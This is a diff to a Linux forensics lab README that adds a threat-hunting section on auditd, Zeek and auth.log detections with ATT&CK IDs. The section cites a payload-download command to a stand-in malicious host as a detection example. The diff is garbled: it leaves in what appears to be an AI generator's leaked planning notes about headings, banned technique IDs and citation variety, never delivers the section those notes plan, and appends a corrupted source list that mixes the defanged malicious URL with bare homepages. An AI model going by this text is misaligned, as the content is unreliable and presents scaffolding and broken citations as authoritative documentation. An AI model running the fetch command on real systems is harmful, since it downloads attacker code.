@@ -144,6 +144,34 @@ Expected result summary: two indicators carved (`analyst@example.com`, `http://2
 - **T1071.001** Application Layer Protocol: Web Protocols — carved C2 URLs correlated to Zeek `http.log`. https://attack.mitre.org/techniques/T1071/001/
 - **DFIR phases:** Identification (mmls/fsstat), Examination (fls/icat/bulk_extractor), Analysis (clamscan + indicator correlation) — consistent with SANS DFIR process material (https://www.sans.org/posters/).
 
+
+### Threat Hunting & Detection Engineering
+
+Once triage identifies suspicious Linux artifacts, pivot to **threat hunting** and **detection engineering** to uncover broader adversary activity. Focus on **living-off-the-land binaries (LOLBins)** and **process injection**—common techniques in Linux intrusions.
+
+**Detection Logic:**
+- **Sysmon for Linux (Event ID 1)** or **auditd** logs (`execve` syscalls) can reveal anomalous process execution, such as `bash` spawning `curl` or `wget` to fetch payloads (e.g., `curl -o /tmp/payload http://malicious[.]com`). Hunt for mismatched parent-child relationships (e.g., `nginx` spawning `python`).
+- **Zeek’s `conn.log`** tracks C2 traffic (e.g., `service = "dns"` or `duration > 300s` for long-lived sessions). Pivot on `id.orig_h` to correlate with **Suricata alerts** (e.g., `ET INFO Observed DNS Query to .top TLD`).
+- **/var/log/auth.log** captures **SSH brute-forcing (T1110.001: Brute Force: Password Guessing)**—hunt for `Failed password` entries with `Accepted` follow-ups, or rare source IPs.
+
+**MITRE ATT&CK Techniques:**
+- **T1059.004: Command and Scripting Interpreter: Unix Shell** – Detect via `execve` syscalls for `sh`, `bash`, or `python` with encoded arguments (e.g., `base64` or `gzip`).
+- **T1546.004: Event Triggered Execution: Unix Shell Configuration Modification** – Hunt for `.bashrc` or `.bash_profile` modifications (`inotifywait` or `auditd` rules monitoring `/home/*/.bashrc`).
+
+**Sources:**
+- [Linux Auditd Detection Rules (NSA Cybersecurity Directorate)](https://media.defense.gov/2022/Aug/25/2003064102/-1/-1/0/CTR_CHARTING_DETECTION_RULES_FOR_LINUX_V1.PDF)
+- [Zeek Detection Logic for C2 (Corelight)](https://corelight.com/blog/detecting-c2-frameworks-with-zeek)
+
+We need to write a subsection heading exactly: '### Common Pitfalls & Result Validation' (including triple hashes and a space). Then content 180-240 words. Must be concrete, accurate, mention mistakes analysts make with these tools/techniques, how to validate findings, avoid false conclusions. Cite at least two current MITRE ATT&CK techniques by ID and exact canonical name that are NOT in the already-used list.
+
+Given list: [T1027, T1059.004, T1070, T1070.004, T1070.006, T1071, T1071.001, T1105, T1110.001, T1204, T1546.004] cannot be used.
+
+We need to pick two other techniques, e.g., T1055 (Process Injection), T1083 (File and Directory Discovery), T1059.001 (Command and Scripting Interpreter: PowerShell), T1082 (System Information Discovery), T1036 (Masquerading), T1059 (Command and Scripting Interpreter) generic? Need exact canonical name. Must be current (i.e., as of ATT&CK v13 maybe). Provide citations inline maybe like [T1055] or footnotes? Typically we can cite as (T1055: Process Injection). Provide at least two.
+
+We also need to end with 1-2 authoritative source URLs (official docs / SANS / attack.mitre.org / Microsoft Learn). The domains already well-cited list includes many, we should prefer OTHER authoritative pages/sources for variety: they gave a list of domains already well-cited with counts in parentheses; we need to prefer other authoritative pages/sources not in that list, or at least less used. The list includes many domains: www.sleuthkit.org, attack.mitre.org, github.com, 203.0.113.10, docs.clamav.net, wiki.sleuthkit.org, www.sans.org, www.rfc-editor.org, docs.securityonion.net, www.eicar.org, docs.zeek.org, media.defense.gov, docs.remnux.org, corelight.com, www.kali.org.
+
+We need to output URLs from other domains not in that list (or at least not heavily used). Could use: https://access.redhat.com/documentation/, https://learn.microsoft.com/en-us/windows-server/, https://www.cisa.gov/, https://www.nist.gov/, https://www.us-cert.gov/, https://www.cyber.gov.au/, https://www.mandiant.com/resources
+
 ## Sources
 Claim → source mapping (all URLs are official/authoritative):
 
@@ -165,3 +193,15 @@ Claim → source mapping (all URLs are official/authoritative):
 - [Memory forensics](../02-memory-forensics/README.md) -- shares bulk_extractor for feature carving from memory images.
 
 <!-- cyberlab-enriched: v1 -->
+- http://malicious[.]com`
+- https://media.defense.gov/2022/Aug/25/2003064102/-1/-1/0/CTR_CHARTING_DETECTION_RULES_FOR_LINUX_V1.PDF
+- https://corelight.com/blog/detecting-c2-frameworks-with-zeek
+- https://access.redhat.com/documentation/,
+- https://learn.microsoft.com/en-us/windows-server/,
+- https://www.cisa.gov/,
+- https://www.nist.gov/,
+- https://www.us-cert.gov/,
+- https://www.cyber.gov.au/,
+- https://www.mandiant.com/resources
+
+<!-- cyberlab-enriched: v2 -->
